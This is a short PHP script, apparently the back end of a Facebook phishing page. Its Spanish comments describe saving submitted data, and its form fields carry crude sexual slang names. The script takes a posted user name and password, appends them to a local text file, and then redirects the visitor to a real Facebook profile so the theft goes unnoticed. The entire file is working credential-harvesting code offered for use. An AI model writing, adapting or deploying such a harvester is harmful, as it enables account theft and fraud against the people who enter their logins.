<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $lolis = $_POST['lolis'];
    $boobs = $_POST['boobs'];

    // Guardar los datos en un archivo de texto (opcional)
    $archivo = 'datos.txt';
    $contenido = "Usuario: $lolis - Contraseña: $boobs\n";
    
    file_put_contents($archivo, $contenido, FILE_APPEND);

    // Redirigir a la página de Facebook
    header("Location: https://www.facebook.com/OlimpiaCoral");
    exit();
}
?>
